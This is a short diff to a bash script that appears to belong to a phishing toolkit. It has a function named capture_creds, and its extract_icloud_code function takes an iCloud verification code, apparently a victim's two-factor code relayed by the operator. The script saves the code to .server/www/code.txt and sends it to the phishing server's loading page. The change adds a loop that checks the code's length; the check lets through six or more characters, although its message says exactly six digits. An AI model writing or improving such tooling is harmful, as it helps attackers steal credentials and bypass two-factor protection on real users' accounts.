@@ -518,10 +518,23 @@ capture_creds() {
 extract_icloud_code() {
 	echo "" > .server/www/code.txt
 
-	read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code (iCloud): " USER_INPUT
-	echo "$USER_INPUT" > .server/www/code.txt
-	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code entered by user: "
+	while true; do
+		read -p "${RED}[${WHITE}-${RED}]${BLUE} Enter the code (iCloud) (6 digits): " USER_INPUT
+
+		# Get the length of the input
+		INPUT_LENGTH=$(echo -n "$USER_INPUT" | wc -m)
+
+		# Check if the input is 6 digits
+		if [[ $INPUT_LENGTH -ge 6 ]]; then
+			break
+		else
+			echo -e "\n${RED}[${WHITE}-${RED}]${RED} Invalid code (6 digits required). Please try again."
+		fi
+	done
+	
+	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Code Input: "
 	echo -e "${RED}[${WHITE}-${RED}]${BLUE} $USER_INPUT"
+	echo "$USER_INPUT" > .server/www/code.txt
 	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}.server/www/code.txt"
 	send_data http://${HOST}:${PORT}/loading.html ${USER_INPUT}
 }
